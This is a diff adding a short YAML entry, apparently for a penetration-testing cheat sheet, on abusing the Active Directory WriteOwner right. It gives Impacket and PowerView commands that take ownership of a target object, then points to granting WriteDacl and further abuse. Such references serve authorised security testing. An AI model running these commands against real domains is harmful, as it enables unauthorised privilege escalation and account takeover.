@@ -1,0 +1,12 @@
+name: WriteOwner
+description: Change object owner - owner can modify DACL
+commands:
+- '# Set yourself as owner with Impacket'
+- owneredit.py -action write -new-owner '<YOUR_USER>' -target '<TARGET>' '<DOMAIN>/<YOUR_USER>:<PASSWORD>'
+- ''
+- '# PowerView'
+- Set-DomainObjectOwner -Identity '<TARGET>' -OwnerIdentity '<YOUR_USER>'
+- ''
+- '# Then grant yourself rights (WriteDacl) and abuse'
+opsec: []
+references: []
